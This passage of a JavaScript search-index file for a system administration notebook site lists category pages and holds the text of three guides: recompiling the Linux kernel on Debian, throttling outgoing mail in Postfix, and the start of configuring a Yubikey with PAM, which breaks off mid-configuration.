                description: "[Filesystems](./bsd/filesystems) • [Kernel](./bsd/kernel) • [Misc](./bsd/misc) • [Network](./bsd/network) • [Packages](./bsd/packages) • [Security](./bsd/security)",
                content: ""
            }
        );
    index.add(
            {
                id:  11 ,
                href: "\/docs\/servers\/web\/caches\/",
                title: "Caches",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  12 ,
                href: "\/docs\/servers\/monitoring\/cacti\/",
                title: "Cacti",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  13 ,
                href: "\/docs\/network\/cisco\/",
                title: "Cisco",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  14 ,
                href: "\/docs\/servers\/cloud-computing\/",
                title: "Cloud computing",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  15 ,
                href: "\/docs\/coding\/",
                title: "Coding",
                description: "[C](./coding/c) • [HTML](./coding/html) • [Java](./coding/java) • [Misc](./coding/misc) • [PHP](./coding/php) • [Perl](./coding/perl) • [Python](./coding/python) • [SQL](./coding/sql) • [Shell Script](./coding/shell-script)",
                content: ""
            }
        );
    index.add(
            {
                id:  16 ,
                href: "\/docs\/mac-os\/coding\/",
                title: "Coding",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  17 ,
                href: "\/docs\/linux\/coding-and-debug\/",
                title: "Coding \u0026 Debug",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  18 ,
                href: "\/docs\/servers\/monitoring\/collectd\/",
                title: "Collectd",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  19 ,
                href: "\/docs\/servers\/configuration-managers\/",
                title: "Configuration Managers",
                description: "[Puppet](./configuration-managers/puppet)",
                content: ""
            }
        );
    index.add(
            {
                id:  20 ,
                href: "\/docs\/servers\/containers\/",
                title: "Containers",
                description: "[OpenVZ](./containers/openvz) • [Solaris Zones](./containers/solaris-zones)",
                content: ""
            }
        );
    index.add(
            {
                id:  21 ,
                href: "\/docs\/servers\/versionning\/cvs\/",
                title: "CVS",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  22 ,
                href: "\/docs\/ethical-hacking\/database\/",
                title: "Database",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  23 ,
                href: "\/docs\/servers\/databases\/",
                title: "Databases",
                description: "[MySQL-MariaDB](./databases/mysql-mariadb) • [NoSQL](./databases/nosql) • [PostgreSQL](./databases/postgresql)",
                content: ""
            }
        );
    index.add(
            {
                id:  24 ,
                href: "\/docs\/linux\/misc\/debian\/",
                title: "Debian",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  25 ,
                href: "\/docs\/linux\/packages\/debian\/",
                title: "Debian",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  26 ,
                href: "\/docs\/linux\/desktop\/",
                title: "Desktop",
                description: "[VNC](./desktop/vnc)",
                content: ""
            }
        );
    index.add(
            {
                id:  27 ,
                href: "\/docs\/servers\/network\/dhcp\/",
                title: "DHCP",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  28 ,
                href: "\/docs\/servers\/dns\/",
                title: "DNS",
                description: "[Bind](./dns/bind) • [PowerDNS](./dns/powerdns)",
                content: ""
            }
        );
    index.add(
            {
                id:  29 ,
                href: "\/docs\/servers\/emails\/",
                title: "eMails",
                description: "[Exchange](./emails/exchange) • [Postfix](./emails/postfix) • [SPF](./emails/spf) • [Spamassassin](./emails/spamassassin)",
                content: ""
            }
        );
    index.add(
            {
                id:  30 ,
                href: "\/docs\/ethical-hacking\/",
                title: "Ethical Hacking",
                description: "[Database](./ethical-hacking/database) • [Misc](./ethical-hacking/misc) • [Network](./ethical-hacking/network) • [Operating Systems](./ethical-hacking/operating-systems) • [Theory](./ethical-hacking/theory)",
                content: ""
            }
        );
    index.add(
            {
                id:  31 ,
                href: "\/docs\/servers\/emails\/exchange\/",
                title: "Exchange",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  32 ,
                href: "\/docs\/servers\/file-sharing\/",
                title: "File sharing",
                description: "[SFTP And FTP](./file-sharing/sftp-and-ftp) • [Samba](./file-sharing/samba) • [ISCSI](./file-sharing/iscsi)",
                content: ""
            }
        );
    index.add(
            {
                id:  33 ,
                href: "\/docs\/bsd\/filesystems\/",
                title: "Filesystems",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  34 ,
                href: "\/docs\/solaris\/filesystems\/",
                title: "Filesystems",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  35 ,
                href: "\/docs\/linux\/filesystems-and-storage\/",
                title: "Filesystems \u0026 Storage",
                description: "[LVM](./filesystems-and-storage/lvm) • [Raid](./filesystems-and-storage/raid) • [Storage Encryption](./filesystems-and-storage/storage-encryption)",
                content: ""
            }
        );
    index.add(
            {
                id:  36 ,
                href: "\/docs\/linux\/firewalls\/",
                title: "Firewalls",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  37 ,
                href: "\/docs\/misc\/fonera\/",
                title: "Fonera",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  38 ,
                href: "\/docs\/bsd\/misc\/freebsd\/",
                title: "FreeBSD",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  39 ,
                href: "\/docs\/servers\/authentication\/freeradius\/",
                title: "FreeRadius",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  40 ,
                href: "\/docs\/servers\/versionning\/git\/",
                title: "Git",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  41 ,
                href: "\/docs\/misc\/google\/",
                title: "Google",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  42 ,
                href: "\/docs\/servers\/high-availability\/ha-proxy\/",
                title: "HA-Proxy",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  43 ,
                href: "\/docs\/mac-os\/hardware\/",
                title: "Hardware",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  44 ,
                href: "\/docs\/servers\/misc\/hardware\/",
                title: "Hardware",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  45 ,
                href: "\/docs\/solaris\/hardware\/",
                title: "Hardware",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  46 ,
                href: "\/docs\/servers\/high-availability\/heartbeat\/",
                title: "Heartbeat",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  47 ,
                href: "\/docs\/servers\/high-availability\/",
                title: "High Availability",
                description: "[HA-Proxy](./high-availability/ha-proxy) • [Heartbeat](./high-availability/heartbeat) • [KeepAlived](./high-availability/keepalived) • [Red Hat Cluster Suite](./high-availability/red-hat-cluster-suite) • [Storage](./high-availability/storage) • [Sun Cluster](./high-availability/sun-cluster)",
                content: ""
            }
        );
    index.add(
            {
                id:  48 ,
                href: "\/docs\/coding\/html\/",
                title: "HTML",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  49 ,
                href: "\/docs\/servers\/misc\/instant-messaging\/",
                title: "Instant mesaging",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  50 ,
                href: "\/docs\/servers\/security\/iptables\/",
                title: "Iptables",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  51 ,
                href: "\/docs\/servers\/file-sharing\/iscsi\/",
                title: "iSCSI",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  52 ,
                href: "\/docs\/coding\/java\/",
                title: "Java",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  53 ,
                href: "\/docs\/servers\/high-availability\/keepalived\/",
                title: "KeepAlived",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  54 ,
                href: "\/docs\/servers\/authentication\/kerberos\/",
                title: "Kerberos",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  55 ,
                href: "\/docs\/bsd\/kernel\/",
                title: "Kernel",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  56 ,
                href: "\/docs\/linux\/kernel\/",
                title: "Kernel",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  57 ,
                href: "\/docs\/servers\/virtualization\/kvm-and-qemu\/",
                title: "KVM \u0026 Qemu",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  58 ,
                href: "\/docs\/misc\/latex\/",
                title: "LaTeX",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  59 ,
                href: "\/docs\/servers\/web\/lighttpd\/",
                title: "Lighttpd",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  60 ,
                href: "\/docs\/ethical-hacking\/operating-systems\/linux\/",
                title: "Linux",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  61 ,
                href: "\/docs\/linux\/",
                title: "Linux",
                description: "[Applications](./linux/applications) • [Coding And Debug](./linux/coding-and-debug) • [Desktop](./linux/desktop) • [Filesystems And Storage](./linux/filesystems-and-storage) • [Firewalls](./linux/firewalls) • [Kernel](./linux/kernel) • [Misc](./linux/misc) • [Multimedia](./linux/multimedia) • [Network](./linux/network) • [Packages](./linux/packages) • [Security](./linux/security)",
                content: ""
            }
        );
    index.add(
            {
                id:  62 ,
                href: "\/docs\/servers\/monitoring\/logging\/",
                title: "Logging",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  63 ,
                href: "\/docs\/linux\/filesystems-and-storage\/lvm\/",
                title: "LVM",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  64 ,
                href: "\/docs\/mac-os\/",
                title: "Mac OS",
                description: "[Applications](./mac-os/applications) • [Coding](./mac-os/coding) • [Hardware](./mac-os/hardware) • [Misc](./mac-os/misc)",
                content: ""
            }
        );
    index.add(
            {
                id:  65 ,
                href: "\/docs\/servers\/webapps\/mediawiki\/",
                title: "MediaWiki",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  66 ,
                href: "\/docs\/bsd\/misc\/",
                title: "Misc",
                description: "[FreeBSD](./misc/freebsd) • [OpenBSD](./misc/openbsd)",
                content: ""
            }
        );
    index.add(
            {
                id:  67 ,
                href: "\/docs\/ethical-hacking\/misc\/",
                title: "Misc",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  68 ,
                href: "\/docs\/linux\/misc\/",
                title: "Misc",
                description: "[Debian](./misc/debian) • [RedHat](./misc/redhat)",
                content: ""
            }
        );
    index.add(
            {
                id:  69 ,
                href: "\/docs\/mac-os\/misc\/",
                title: "Misc",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  70 ,
                href: "\/docs\/misc\/",
                title: "Misc",
                description: "[Fonera](./misc/fonera) • [Google](./misc/google) • [LaTeX](./misc/latex) • [Misc](./misc/misc) • [Soekris](./misc/soekris)",
                content: ""
            }
        );
    index.add(
            {
                id:  71 ,
                href: "\/docs\/misc\/misc\/",
                title: "Misc",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  72 ,
                href: "\/docs\/servers\/misc\/",
                title: "Misc",
                description: "[Hardware](./misc/hardware) • [Instant Messaging](./misc/instant-messaging) • [NTP](./misc/ntp) • [Remote Install](./misc/remote-install)",
                content: ""
            }
        );
    index.add(
            {
                id:  73 ,
                href: "\/docs\/solaris\/misc\/",
                title: "Misc",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  74 ,
                href: "\/docs\/windows\/misc\/",
                title: "Misc",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  75 ,
                href: "\/docs\/servers\/monitoring\/",
                title: "Monitoring",
                description: "[Cacti](./monitoring/cacti) • [Collectd](./monitoring/collectd) • [Logging](./monitoring/logging) • [Munin](./monitoring/munin) • [Nagios](./monitoring/nagios)",
                content: ""
            }
        );
    index.add(
            {
                id:  76 ,
                href: "\/docs\/linux\/multimedia\/",
                title: "Multimedia",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  77 ,
                href: "\/docs\/servers\/monitoring\/munin\/",
                title: "Munin",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  78 ,
                href: "\/docs\/servers\/databases\/mysql-mariadb\/",
                title: "MySQL/MariaDB",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  79 ,
                href: "\/docs\/servers\/monitoring\/nagios\/",
                title: "Nagios",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  80 ,
                href: "\/docs\/linux\/network\/netcat\/",
                title: "Netcat",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  81 ,
                href: "\/docs\/bsd\/network\/",
                title: "Network",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  82 ,
                href: "\/docs\/ethical-hacking\/network\/",
                title: "Network",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  83 ,
                href: "\/docs\/linux\/network\/",
                title: "Network",
                description: "[Netcat](./network/netcat) • [OpenSSH](./network/openssh)",
                content: ""
            }
        );
    index.add(
            {
                id:  84 ,
                href: "\/docs\/network\/",
                title: "Network",
                description: "[Cisco](./network/cisco) • [Theory](./network/theory)",
                content: ""
            }
        );
    index.add(
            {
                id:  85 ,
                href: "\/docs\/servers\/network\/",
                title: "Network",
                description: "[DHCP](./network/dhcp) • [VPN](./network/vpn)",
                content: ""
            }
        );
    index.add(
            {
                id:  86 ,
                href: "\/docs\/solaris\/network\/",
                title: "Network",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  87 ,
                href: "\/docs\/servers\/web\/nginx\/",
                title: "Nginx",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  88 ,
                href: "\/docs\/servers\/databases\/nosql\/",
                title: "NoSQL",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  89 ,
                href: "\/docs\/servers\/misc\/ntp\/",
                title: "NTP",
                description: "[Hardware](./misc/hardware)",
                content: ""
            }
        );
    index.add(
            {
                id:  90 ,
                href: "\/docs\/bsd\/misc\/openbsd\/",
                title: "OpenBSD",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  91 ,
                href: "\/docs\/servers\/authentication\/openldap\/",
                title: "OpenLDAP",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  92 ,
                href: "\/docs\/linux\/applications\/openssh\/",
                title: "OpenSSH",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  93 ,
                href: "\/docs\/linux\/network\/openssh\/",
                title: "OpenSSH",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  94 ,
                href: "\/docs\/servers\/containers\/openvz\/",
                title: "OpenVZ",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  95 ,
                href: "\/docs\/ethical-hacking\/operating-systems\/",
                title: "Operating Systems",
                description: "[Linux](./operating-systems/linux) • [Windows](./operating-systems/windows)",
                content: ""
            }
        );
    index.add(
            {
                id:  96 ,
                href: "\/docs\/bsd\/packages\/",
                title: "Packages",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  97 ,
                href: "\/docs\/linux\/packages\/",
                title: "Packages",
                description: "[Debian](./packages/debian) • [RedHat](./packages/redhat)",
                content: ""
            }
        );
    index.add(
            {
                id:  98 ,
                href: "\/docs\/solaris\/packages\/",
                title: "Packages",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  99 ,
                href: "\/docs\/servers\/security\/packet-filter\/",
                title: "Packet Filter",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  100 ,
                href: "\/docs\/servers\/authentication\/pam\/",
                title: "PAM",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  101 ,
                href: "\/docs\/coding\/perl\/",
                title: "Perl",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  102 ,
                href: "\/docs\/coding\/php\/",
                title: "PHP",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  103 ,
                href: "\/docs\/servers\/emails\/postfix\/",
                title: "Postfix",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  104 ,
                href: "\/docs\/servers\/databases\/postgresql\/",
                title: "PostgreSQL",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  105 ,
                href: "\/docs\/servers\/dns\/powerdns\/",
                title: "PowerDNS",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  106 ,
                href: "\/docs\/servers\/web\/proxy\/",
                title: "Proxy",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  107 ,
                href: "\/docs\/servers\/configuration-managers\/puppet\/",
                title: "Puppet",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  108 ,
                href: "\/docs\/coding\/python\/",
                title: "Python",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  109 ,
                href: "\/docs\/servers\/authentication\/radius\/",
                title: "Radius",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  110 ,
                href: "\/docs\/linux\/filesystems-and-storage\/raid\/",
                title: "Raid",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  111 ,
                href: "\/docs\/servers\/high-availability\/red-hat-cluster-suite\/",
                title: "Red Hat Cluster Suite",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  112 ,
                href: "\/docs\/linux\/misc\/redhat\/",
                title: "RedHat",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  113 ,
                href: "\/docs\/linux\/packages\/redhat\/",
                title: "RedHat",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  114 ,
                href: "\/docs\/servers\/misc\/remote-install\/",
                title: "Remote install",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  115 ,
                href: "\/docs\/servers\/webapps\/rss-feeder\/",
                title: "RSS feeder",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  116 ,
                href: "\/docs\/servers\/file-sharing\/samba\/",
                title: "Samba",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  117 ,
                href: "\/docs\/bsd\/security\/",
                title: "Security",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  118 ,
                href: "\/docs\/linux\/security\/",
                title: "Security",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  119 ,
                href: "\/docs\/servers\/security\/",
                title: "Security",
                description: "[Iptables](./security/iptables) • [Packet Filter](./security/packet-filter) • [Snort](./security/snort)",
                content: ""
            }
        );
    index.add(
            {
                id:  120 ,
                href: "\/docs\/servers\/",
                title: "Servers",
                description: "[Authentication](./servers/authentication) • [Backups](./servers/backups) • [Cloud Computing](./servers/cloud-computing) • [Configuration Managers](./servers/configuration-managers) • [Containers](./servers/containers) • [DNS](./servers/dns) • [Databases](./servers/databases) • [File Sharing](./servers/file-sharing) • [High Availability](./servers/high-availability) • [Misc](./servers/misc) • [Monitoring](./servers/monitoring) • [Network](./servers/network) • [Security](./servers/security) • [Versionning](./servers/versionning) • [Virtualization](./servers/virtualization) • [Web](./servers/web) • [Webapps](./servers/webapps) • [EMails](./servers/emails)",
                content: ""
            }
        );
    index.add(
            {
                id:  121 ,
                href: "\/docs\/solaris\/applications\/services\/",
                title: "Services",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  122 ,
                href: "\/docs\/servers\/file-sharing\/sftp-and-ftp\/",
                title: "SFTP \u0026 FTP",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  123 ,
                href: "\/docs\/linux\/applications\/shell\/",
                title: "Shell",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  124 ,
                href: "\/docs\/coding\/shell-script\/",
                title: "Shell script",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  125 ,
                href: "\/docs\/servers\/security\/snort\/",
                title: "Snort",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  126 ,
                href: "\/docs\/misc\/soekris\/",
                title: "Soekris",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  127 ,
                href: "\/docs\/solaris\/",
                title: "Solaris",
                description: "[Applications](./solaris/applications) • [Filesystems](./solaris/filesystems) • [Hardware](./solaris/hardware) • [Misc](./solaris/misc) • [Network](./solaris/network) • [Packages](./solaris/packages)",
                content: ""
            }
        );
    index.add(
            {
                id:  128 ,
                href: "\/docs\/servers\/containers\/solaris-zones\/",
                title: "Solaris Zones",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  129 ,
                href: "\/docs\/servers\/emails\/spamassassin\/",
                title: "Spamassassin",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  130 ,
                href: "\/docs\/servers\/emails\/spf\/",
                title: "SPF",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  131 ,
                href: "\/docs\/coding\/misc\/",
                title: "SQL",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  132 ,
                href: "\/docs\/coding\/sql\/",
                title: "SQL",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  133 ,
                href: "\/docs\/servers\/authentication\/sso\/",
                title: "SSO",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  134 ,
                href: "\/docs\/servers\/high-availability\/storage\/",
                title: "Storage",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  135 ,
                href: "\/docs\/linux\/filesystems-and-storage\/storage-encryption\/",
                title: "Storage Encryption",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  136 ,
                href: "\/docs\/servers\/high-availability\/sun-cluster\/",
                title: "Sun Cluster",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  137 ,
                href: "\/docs\/servers\/versionning\/svn\/",
                title: "SVN",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  138 ,
                href: "\/docs\/",
                title: "Tech Notebook",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  139 ,
                href: "\/docs\/linux\/applications\/text-editors\/",
                title: "Text Editors",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  140 ,
                href: "\/docs\/ethical-hacking\/theory\/",
                title: "Theory",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  141 ,
                href: "\/docs\/network\/theory\/",
                title: "Theory",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  142 ,
                href: "\/docs\/solaris\/applications\/users-management\/",
                title: "Users management",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  143 ,
                href: "\/docs\/servers\/versionning\/",
                title: "Versionning",
                description: "[CVS](./versionning/cvs) • [Git](./versionning/git) • [SVN](./versionning/svn)",
                content: ""
            }
        );
    index.add(
            {
                id:  144 ,
                href: "\/docs\/servers\/virtualization\/",
                title: "Virtualization",
                description: "[KVM And Qemu](./virtualization/kvm-and-qemu) • [XenServer](./virtualization/xenserver) • [XenSource](./virtualization/xensource)",
                content: ""
            }
        );
    index.add(
            {
                id:  145 ,
                href: "\/docs\/linux\/desktop\/vnc\/",
                title: "VNC",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  146 ,
                href: "\/docs\/servers\/network\/vpn\/",
                title: "VPN",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  147 ,
                href: "\/docs\/servers\/web\/",
                title: "Web",
                description: "[Apache](./web/apache) • [Caches](./web/caches) • [Lighttpd](./web/lighttpd) • [Nginx](./web/nginx) • [Proxy](./web/proxy)",
                content: ""
            }
        );
    index.add(
            {
                id:  148 ,
                href: "\/docs\/servers\/webapps\/",
                title: "Webapps",
                description: "[Mediawiki](./webapps/mediawiki) • [RSS Feeder](./webapps/rss-feeder) • [Wordpress](./webapps/wordpress)",
                content: ""
            }
        );
    index.add(
            {
                id:  149 ,
                href: "\/docs\/ethical-hacking\/operating-systems\/windows\/",
                title: "Windows",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  150 ,
                href: "\/docs\/windows\/",
                title: "Windows",
                description: "[Applications](./windows/applications) • [Misc](./windows/misc)",
                content: ""
            }
        );
    index.add(
            {
                id:  151 ,
                href: "\/docs\/servers\/webapps\/wordpress\/",
                title: "Wordpress",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  152 ,
                href: "\/docs\/servers\/virtualization\/xenserver\/",
                title: "XenServer",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  153 ,
                href: "\/docs\/servers\/virtualization\/xensource\/",
                title: "XenSource",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  154 ,
                href: "\/Recompiler_son_du_noyau_(Kernel)\/",
                title: "Recompile your kernel",
                description: "A guide on how to recompile the Linux kernel on various distributions including CentOS, Debian, Fedora, Mandriva, Suse, and Ubuntu",
                content: "Linux linkCentOS linkCentOS Kernel 2.6\nDebian linkHere is a list of packages needed to recompile the kernel:\naptitude install bzip2 libncurses5-dev fakeroot kernel-package Let’s go to /usr/src:\ncd /usr/src Then, go to www.kernel.org and download the latest version in “Full” of the latest kernel. Here, it’s version 4.8.4, then we extract it:\nwget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.8.4.tar.xz tar -xJf linux-4.8.4.tar.xz Now let’s create a symbolic link:\nln -s linux-4.8.4 linux The kernel is ready to be configured. Let’s launch the configuration tool:\ncd linux make menuconfig Or copy the configuration of your existing kernel:\ncp /boot/config-$(uname -r) .config To avoid a “x509_certificate” error during compilation, we will disable the kernel signature (we don’t have the signature key, it belongs to Debian):\nsed -i 's/^CONFIG_SYSTEM_TRUSTED_KEY/# CONFIG_SYSTEM_TRUSTED_KEY/g' .config sed -i 's/^CONFIG_MODULE_SIG_KEY/# CONFIG_MODULE_SIG_KEY/g' .config It’s possible to use all of your cores to speed up compilation time:\nexport CONCURRENCY_LEVEL=`grep -c \"^processor\" /proc/cpuinfo` New method linkOnce configured, all that’s left is to launch the compilation:\nmake clean make deb-pkg LOCALVERSION=-custom KDEB_PKGVERSION=$(make kernelversion)-1 -j $CONCURRENCY_LEVEL You can change the name of LOCALVERSION to a name that suits you better and increment KDEB_PKGVERSION each time you compile.\nOld method linkOnce configured, all that’s left is to launch the compilation:\nmake-kpkg clean make-kpkg --initrd --revision=1.0 kernel_image or without initrd:\nmake-kpkg --revision=1.0 kernel_image The revision tag is used to put a version number on your kernel. That way, if during the next boot you get a kernel panic, restart with the old one and start over. When recompiling it, increment the version by 1 (ex: –revision=2.0).\nYour kernel is now finished, let’s install it:\ndpkg -i ../linux-image-4.8.4_1.0_amd64.deb Now restart your machine and boot on your new kernel :-)\nHere are other documentations:\nDebian Kernel 2.4\nDebian Kernel 2.6\nFedora Core linkFedora Kernel\nMandriva linkMandriva Kernel\nSuse linkSuse Kernel\nUbuntu linkUbuntu Kernel\n"
            }
        );
    index.add(
            {
                id:  155 ,
                href: "\/Postfix:_limit_outgoing_mail_throttling\/",
                title: "Postfix: Limit Outgoing Mail Throttling",
                description: "Learn how to limit outgoing mail throttling in Postfix to prevent blacklisting from MX servers when sending large volumes of email.",
                content: " Software version 2.10 Operating System Debian 7 Website Postfix Website Last Update 06/08/2015 Introduction linkWhen you have a huge amount of mail to deliver, you can’t release the queue at once and let the server maximize the outgoing mail throughput! The result will be: you’ll get blacklisted from a lot of MX servers.\nThat’s why you should take care of it and do traffic shaping\nUsage linkYou can add those lines in your Postfix configuration1:\nsmtp_destination_concurrency_limit = 2 smtp_destination_rate_delay = 1s smtp_extra_recipient_limit = 10 default_destination_concurrency_limit: This means that postfix will up to two concurrent connections per receiving domains. The default value is 20. default_destination_rate_delay: Postfix will add a delay between each message to the same receiving domain. It overrides the previous rule and in this example, it will send one email after another with a delay of 1 second. If you want to disable this rule, either delete it or set to 0. default_extra_recipient_limit: Limit the number of recipients of each message. If a message had 20 recipients on the same domain, postfix will break it out to two different email messages instead of one. Then restart your Postfix.\nLimit by domain linkYou can limit per domain if you want like this:\ntransport_maps = hash:/etc/postfix/transport # Throttle limit policy mail (global) smtp_destination_concurrency_limit = 4 smtp_extra_recipient_limit = 2 # Polite policy polite_destination_concurrency_limit = 3 polite_destination_rate_delay = 0 polite_destination_recipient_limit = 5 # Turtle policy turtle_destination_concurrency_limit = 2 turtle_destination_rate_delay = 1s turtle_destination_recipient_limit = 2 Then add domains with the wished policy:\ngmail.com polite: yahoo.com polite: hotmail.com turtle: live.fr turtle: orange.fr turtle: Edit master configuration to inform postfix of those config. Add those lines:\npolite unix - - n - - smtp turtle unix - - n - - smtp Postmap and reload:\npostmap /etc/postfix/transport service postfix reload You’re done :-)\nResources link http://steam.io/2013/04/01/postfix-rate-limiting/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  156 ,
                href: "\/Yubikey_:_Configure_your_yubikey_with_pam\/",
                title: "Yubikey: Configure Your Yubikey with PAM",
                description: "Guide on setting up Yubikey with PAM for two-factor authentication on Linux systems, including configuration for challenge-response mode and automatic screen locking when the key is removed.",
                content: " Operating System Debian 7/8 Website Yubikey Website Last Update 22/04/2015 Introduction linkI’ve bought Yubikeys to manage several things. They permit 2 different kinds of authentication per key. The authentication methods are:\nYubico OTP OATH-HOTP Static Password Challenge-Response The goal was to authenticate through my Yubikey without a password, but still have the possibility to connect with my user password if I lose my key. Another requirement is to lock my computer if I remove the key.\nInstallation linkTo install, we’ll use packages. One for PAM and the GUI for configuration:\naptitude install yubikey-personalization-gui libpam-yubico Configuration linkChallenge-Response linkGui linkWe’re now going to configure the key. Insert it and launch the GUI:\nyubikey-personalization-gui Select the challenge-response menu and SHA-1 challenge:\nThen select all options as shown in the screen below:\nThe 3rd step, if checked, requires a 2.5 second key press to unlock.\nThen save the challenge-response to your user settings:\nykpamcfg -v -2 pam linkThe configuration of PAM is quick and easy, simply add this line (/etc/pam.d/common-auth):\n# # /etc/pam.d/common-auth - authentication settings common to all services # # This file is included from other service-specific PAM config files, # and should contain a list of the authentication modules that define # the central authentication scheme for use on the system # (e.g., /etc/shadow, LDAP, Kerberos, etc.). The default is to use the # traditional Unix authentication mechanisms. # # As of pam 1.0.1-6, this file is managed by pam-auth-update by default. # To take advantage of this, it is recommended that you configure any # local modules either before or after the default block, and use # pam-auth-update to manage selection of other modules. See # pam-auth-update(8) for details. # here are the per-package modules (the \"Primary\" block) auth sufficient 